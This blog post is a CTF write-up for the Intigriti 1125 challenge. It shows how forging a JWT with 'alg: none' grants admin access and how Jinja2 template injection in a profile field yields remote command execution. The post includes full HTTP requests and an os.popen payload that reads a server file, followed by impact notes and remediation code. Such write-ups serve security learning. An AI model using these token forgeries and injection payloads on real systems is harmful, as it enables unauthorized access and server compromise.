---
layout: post
title: "Write-up: Intigriti 1125"
date: 2025-11-25 12:30:00 -0300
categories: [write-up, bugbounty, ctf]
published: true
---


Hi, folks! 

It's my first report at the Intigriti platform and my first time participating on Intigriti CTF.
This writeup shows how an unsanitized field and an implementation failure in a JWT token can lead to an RCE.

## The journey
I started my recon looking all the application endpoints and headers, looking for entry points or something that pay my attention. I noticed that the application was a Server-Side Rendering (SSR) and started to look for injection points, like Shop Categories parameters, but it's not reflected and there was filtered my payloads.

![alt text](./intigriti-challenge-1125/intigriti-challenge-1125-page.png)

So, I was noticed the admin routes and started to look for the `session` and `token` Cookies. I spent a LOT of time on this, trying to broke the JWT token and Session secrets, but for my sadness, it is unsuccessful.

Later, I tried the `alg: none` attack at JWT and the things started to clarify in my mind.
I spent a lot of time (again) trying to manipulate the products, orders and users at admin routes. And much hours (than I like to admit) trying to pop a RCE at `username` and `role` fields at /dashboard page.

The lights comes when I changed display name on `/admin/profile` page and tried to inject the good and old `{{ 9*9 }}` SSTI payload. Then, boom! Next steps is how I explored and got the Challenge Flag.

### Steps to reproduce:

* Create a user and do a Login on application with any user that you created. Your `role` it must be `user`.
* Try to access `/admin/profile` endpoint and you will got a `HTTP 302` to /login and `Admin access required` message:
 {466243}
 * Open Burp or any proxy tool and you will see the `token` Cookie. Send this request to Repeater.
 ```http
GET /admin/profile HTTP/1.1
Host: challenge-1125.intigriti.io
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMywidXNlcm5hbWUiOiJxdWludGEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc2MzkxNTYyNH0.BHUmikSNFr9P17m9HOxsuJWNvnKCJOY7mTT33ozZf5w; session=eyJjYXJ0IjpbXX0.aSHrqA.dJtLzyuHFhfATZKUykrkFmK8uaM
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
 ```
 * Get the JWT token and remove the signature for our `alg: none` attack. You can use JWT.io, CyberChef or JWT Editor on Burp.
 ```json
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxMywidXNlcm5hbWUiOiJxdWludGEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc2MzkxNTYyNH0.
 ```
 * Change the `Content-Type` Header to `application/x-www-form-urlencoded`.
 * Don't forget to change the `role` to `admin`. 
 * Change the request method to `POST` and insert your payload on `display_name` at form-urlencoded field. Example:
	 * `{{ 9*9 }}`

### To obtain a flag

* At first, I used `ls -lah` command to list files.
* After this, I saw a directory `./.aquacommerce` at workdir.

* So, the request to obtain the flag:

```http
POST /admin/profile HTTP/2
Host: challenge-1125.intigriti.io
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxMywidXNlcm5hbWUiOiJxdWludGEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NjM5MTU2MjR9.; session=eyJjYXJ0IjpbXX0.aSHrgw.zoq3ROmf6irozpmpOK6r4Jx48qQ
Content-Length: 87
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://challenge-1125.intigriti.io
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://challenge-1125.intigriti.io/admin/profile
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

display_name={{lipsum.__globals__.os.popen('cat ./.aquacommerce/019a82cf.txt').read()}}
```


* Response with flag renderized:

```html
  <!-- Current Display Name -->
  <div class="mb-8">
    <label class="block text-sm font-semibold text-slate-300 mb-3">Current Display Name</label>
    <div class="p-4 bg-slate-700/50 border border-slate-600 rounded-lg">
      <p class="text-slate-100 font-medium">INTIGRITI{019a82cf-REDACTED-2d0ef30bea32}</p>
    </div>
  </div>
```

### We got the Flag!!
![alt text](./intigriti-challenge-1125/intigriti-challenge-1125-got-flag.png)

### Flag:
>INTIGRITI{019a82cf-REDACTED-2d0ef30bea32}


## What do we learned?

## Impact
A Server-Side Template Injection (SSTI) vulnerability in the admin profile page allows an attacker to execute arbitrary commands on the server, leading to full Remote Code Execution (RCE).
Impacts, thinking on a real scenario:

* Complete server compromise through Remote Code Execution
* Unauthorized access to sensitive files and data
* Ability to execute arbitrary system commands
* Potential data breach and system takeover
* No user interaction required for exploitation

___

## Recommended remediation solution

* Reject tokens with alg: none
* Implement strict algorithm whitelist (only allow HS256)
```python
jwt.decode(token, secret, algorithms=['HS256'])  # Explicit algorithm
```

* Enable auto-escaping in Jinja2 or some template based server.
```python
app.jinja_env.autoescape = True
```

* Sanitize all user input before rendering:
```python
from markupsafe import escape
display_name = escape(user_input)
```


## Conclusion
I had a lot of fun with this challenge. I hope this writeup was "understandable" enough and light to read.
See ya in the next chall.

Hugs,
Quinta


Useful links:
  - Intigriti Challenge 11/25: https://challenge-1125.intigriti.io